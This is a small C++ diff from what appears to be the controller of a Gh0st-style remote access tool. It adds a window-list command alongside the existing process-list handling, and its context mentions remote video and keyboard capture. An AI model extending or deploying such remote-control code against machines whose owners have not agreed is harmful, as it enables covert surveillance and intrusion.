@@ -536,6 +536,8 @@ void CCcRemoteDlg::OnOnlineVideo()
 void CCcRemoteDlg::OnOnlineWindow()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_WSLIST;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -821,6 +823,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	case TOKEN_KEYBOARD_START:
 		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;*/
+
+	//进程遍历和窗口遍历公用的一个窗口类，在构造判断判断下类型来显示不同的数据
+	case TOKEN_WSLIST:
 	case TOKEN_PSLIST:
 		g_pCcRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
 		break;
